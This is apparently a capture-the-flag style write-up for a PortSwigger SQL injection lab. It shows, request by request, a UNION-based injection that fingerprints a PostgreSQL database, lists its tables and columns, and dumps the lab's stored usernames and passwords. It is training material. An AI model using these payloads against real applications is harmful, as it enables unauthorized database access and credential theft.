# Lab 08: SQL injection attack, listing the database contents on non-Oracle databases

## Description

This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a `UNION` attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

---

## Solution

The product category filter is the HTTP query parameter `category`. The goal is to read the credentials of the `administrator` account from an unknown database table using a `UNION` attack. We will follow the following process:

1. Verify the SQL injection vulnerability
2. Identify the comment syntax
3. Figure out the number of columns in the resultant row set from the original `SELECT` statement and figure out those columns' data types
4. Enumerate the database version
5. Enumerate table names to discover the target table containing credentials
6. Enumerate columns names to discover the target columns within the credential table
7. Read the credentials and login as `administrator`

### Verify SQL injection vulnerability

To verify the presence of the SQL injection vulnerability, we'll send a request with and without a single `'` in the `category` query parameter and compare the response behavior of each.

#### Regular request - no `'`

```http
GET /filter?category=Pets HTTP/1.1
Host: acf01f921f3267cd803c0b19006e0075.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 8518
```

#### Irregular request - with `'`

```http
GET /filter?category=Pets' HTTP/1.1
Host: acf01f921f3267cd803c0b19006e0075.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Length: 21

Internal Server Error
```

The application returns an error, indicating the presence of the SQL injection vulnerability.

### Identify comment syntax

Identifying the correct comment syntax is crucial in being able to inject into the original SQL query without causing an error. We'll iterate through different SQL comments and determine which one is syntactically correct, indicated by a successful response from the web application.

| Comment | Success | 
| --- | --- |
| `--` | Y | 
|  `--%20` | Y |
| `#` | N |

The fact that a `#` comment failed and a `--` comment (no trailing whitespace) succeeded rules out the database version as MySQL.

We'll move forward with `--` as our comment indicator.

### Number of columns & data types of columns

To identify the number of columns in the resultant set from the original `SELECT` statement, we'll use the incremental `ORDER BY` method.

Sarting from 1, this method received an error when attempting to order by column index 3, indicating the presence of 2 columns.

```http
GET /filter?category=Pets'+ORDER+BY+3-- HTTP/1.1
Host: acf01f921f3267cd803c0b19006e0075.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Length: 21

Internal Server Error
```

To return the credentials, we'll need at least one of the columns to be of type string. Looking at the output from the `ORDER BY 1` and `ORDER BY 2` injections, we can deduce that the product name is at column index 1 and the product description is at column index 2. Since both of these are most probably strings, we can use both in our `UNION` attack to return both the username and password columns from the currently unknown target table.

We can verify this hypothesis by injecting `UNION SELECT 'a', 'b'`. If the web application doesn't return an error, our hypothesis is correct.

```http
GET /filter?category=Pets'+UNION+SELECT+'a','b'-- HTTP/1.1
Host: acf01f921f3267cd803c0b19006e0075.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 8704
```

The web application responded normally, indicating that indeed both columns are of type string. As an aside, the fact that the previous `UNION SELECT` operation without having to specify a target table using the `FROM` operator rules out the target database as Oracle.

### Enumerate database version

With both columns from the resultant row set of the original `SELECT` query available to us, we'll iterate through various version query syntaxes to determine the version of the target database.

#### MSSQL - No

```http
GET /filter?category=Pets'+UNION+SELECT+'version',@@version-- HTTP/1.1
Host: acf01f921f3267cd803c0b19006e0075.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Length: 21

Internal Server Error
```

#### PostgreSQL - Yes

```http
GET /filter?category=Pets'+UNION+SELECT+'version',version()-- HTTP/1.1
Host: acf01f921f3267cd803c0b19006e0075.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```html
<tr>
	<th>
		version
	</th>
	<td>
		PostgreSQL 11.12 (Debian 11.12-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit
	</td>
</tr>
```

The database is PostgreSQL 11.12 on a Debian Linux machine.

### Table name & column name enumeration

Since we know the target database is PostgreSQL, we know we'll have to query the `information_schema` database to determine table names and column names.

```http
GET /filter?category=Pets'+UNION+SELECT+'table',TABLE_NAME+FROM+information_schema.tables-- HTTP/1.1
Host: acf01f921f3267cd803c0b19006e0075.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

This request returned *many* table names in the web page, so we save the HTML to `file.html` and use the following Python snippet to extract just the table names and manually read through them to find the target table: `users_vhedkl`.

```python
from bs4 import BeautifulSoup                                                             

with open("file.html") as f:
	soup = BeautifulSoup(f, "html.parser")
	tds = soup.findAll("td")
	tds = [td.contents[0] for td in tds if td.contents[0][:3] != "pg_" and len(td.contents[0]) < 30]
	for td in tds:
		print(td)
```

```bash
$ python3 parse.py

...
products
foreign_table_options
users_vhedkl
foreign_servers
_pg_user_mappings
...
```

With the target table name in hand, we query `information_schema` again to determine its columns.

```http
GET /filter?category=Pets'+UNION+SELECT+COLUMN_NAME,DATA_TYPE+FROM+information_schema.columns+WHERE+TABLE_NAME+=+'users_vhedkl'-- HTTP/1.1
Host: ac2b1fa91ebc7502803424f000390053.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```html
<tr>
	<th>password_ldemmx</th>
	<td>character varying</td>
</tr>
<tr>
	<th>username_byefrz</th>
	<td>character varying</td>
</tr>
```

We find the username and password columns as `username_byefrz` and `password_ldemmx`, respectively and both of type string.

### Read the credentials

Putting it all together, we can send the following request to render the credentials on the web page, retrieve `administrator`'s password, and login.

```http
GET /filter?category=Pets'+UNION+SELECT+username_byefrz,password_ldemmx+FROM+users_vhedkl-- HTTP/1.1
Host: ac2b1fa91ebc7502803424f000390053.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/
```

```html
<tbody>
	<tr>
		<th>administrator</th>
		<td>7nmmshti7w3c3xu9ou1z</td>
	</tr>
	<tr>
		<th>wiener</th>
		<td>pwc4cvrrouk5hs0ck9j9</td>
	</tr>
	<tr>
		<th>carlos</th>
		<td>ua0rdz1cfqm9b6nw5sm3</td>
	</tr>
</tbody>
```